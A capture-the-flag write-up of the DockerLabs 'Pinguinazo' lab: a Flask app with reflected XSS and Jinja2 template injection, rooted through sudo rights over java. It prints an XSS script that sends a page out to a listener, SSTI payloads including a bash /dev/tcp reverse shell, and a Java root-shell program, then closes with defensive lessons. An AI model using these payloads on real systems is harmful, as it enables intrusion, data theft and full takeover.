# Pinguinazo - DockerLabs - Easy

## Summary

Pinguinazo is an easy DockerLabs machine running a Flask web application vulnerable to both XSS and Server-Side Template Injection (SSTI). Exploitation of the SSTI vulnerability gives direct RCE as the `pinguinazo` user. Privilege escalation to root is achieved by abusing `sudo` rights over `/usr/bin/java` to spawn a root shell via a compiled `ProcessBuilder` payload.

| Tool | Purpose |
| --- | --- |

| Browser DevTools | XSS confirmation and HTML inspection |
| `netcat` (nc) | Listener for data exfiltration |
| SSTI payloads (Jinja2) | Remote Code Execution via template injection |
| `javac` / `java` | Privilege escalation via sudo abuse |

## 1. Enumeration

The target runs a Flask web application on port `5000`. Initial browsing reveals a form with a name field whose output is reflected in the page, which immediately suggests injection vulnerabilities.

Directory enumeration with `gobuster` uncovers the `/console` endpoint:

```bash
gobuster dir -u http://172.17.0.2:5000 -w /usr/share/wordlists/dirb/common.txt -x php,html,txt -t 20
```

Key findings:

- `/` — form with a reflected name field
- `/console` — Werkzeug Interactive Debugger (PIN-protected)

The `/console` page reveals it is running **Werkzeug's debug mode**, which exposes a Python REPL protected by a PIN. The page source also leaks a `SECRET` token (`BZwHZeP5LVCQ5TkdtkTm`) in a JavaScript variable, though the PIN is still required to execute commands directly.

## 2. Exploitation

### XSS Discovery

The name field reflects input unsanitized into the page via Flask's `render_template_string()`. Injecting `<script>alert(1)</script>` triggers a popup, confirming **Reflected XSS**. Inspection of `app.py` confirms the root cause:

```python
@app.route('/greet', methods=['POST'])
def greet():
    name = request.form['name']
    template = f"Hello {name}!"  # No sanitization applied
    return render_template_string(template)
```

### Exfiltrating the Werkzeug SECRET via XSS

With XSS confirmed, the `/console` page is fetched from the server's own origin and its content exfiltrated in base64:

```html
<script>
fetch('http://172.17.0.2:5000/console')
  .then(r=>r.text())
  .then(d=>fetch('http://192.168.1.26:4444/?d='+btoa(d)))
</script>
```

The received base64 is decoded locally:

```bash
echo "<BASE64>" | base64 -d
```

The decoded HTML contains the `SECRET` embedded in a JavaScript variable. However, the Werkzeug PIN is still required to unlock the console — the SECRET alone is insufficient.

### SSTI — Remote Code Execution

Since the input is passed directly into `render_template_string()`, it is also vulnerable to **Server-Side Template Injection (SSTI)**. Confirmation:

```
{{7*7}}
```

Returns `49` — Jinja2 SSTI confirmed. RCE is achieved with:

```
{{self.__init__.__globals__.__builtins__.__import__('os').popen('id').read()}}
```

Reverse shell — with `nc -lvnp 4444` listening:

```
{{self.__init__.__globals__.__builtins__.__import__('os').popen('bash -c "bash -i >& /dev/tcp/192.168.1.26/4444 0>&1"').read()}}
```

This yields a shell as user `pinguinazo`.

## 3. Escalate Privileges

Once on the box as `pinguinazo`, checking sudo permissions reveals:

```bash
sudo -l
# (root) NOPASSWD: /usr/bin/java
```

`java` is allowed to run as root without a password. A `ProcessBuilder` shell payload is compiled on the target:

```bash
cat > Shell.java << 'EOF'
public class Shell {
    public static void main(String[] args) throws Exception {
        new ProcessBuilder("/bin/sh").inheritIO().start().waitFor();
    }
}
EOF

javac Shell.java
```

Executing with sudo spawns a root shell:

```bash
sudo /usr/bin/java Shell
# whoami → root
```

> **Note:** The `Shell.class` binary can alternatively be compiled offline and uploaded to the target if `javac` is not present.

## 4. Lessons Learned

**Never use `render_template_string()` with unsanitized user input.** Passing user-controlled strings directly into a Jinja2 template renderer is the root cause of both the XSS and the SSTI. The fix is to use `render_template()` with a static template file and pass the user value as a context variable — Jinja2 will then escape it automatically.

**Debug mode must be disabled in production.** Running Flask with `debug=True` and `host='0.0.0.0'` exposes the Werkzeug interactive console to the network. Even with PIN protection, the SECRET leaks via XSS and the console represents a critical attack surface.

**Least privilege for sudo.** Granting `NOPASSWD` sudo rights over a binary capable of spawning a shell (`java`, `python`, `vim`, etc.) is equivalent to granting unrestricted root access. Check GTFOBins before allowing any binary via sudo.
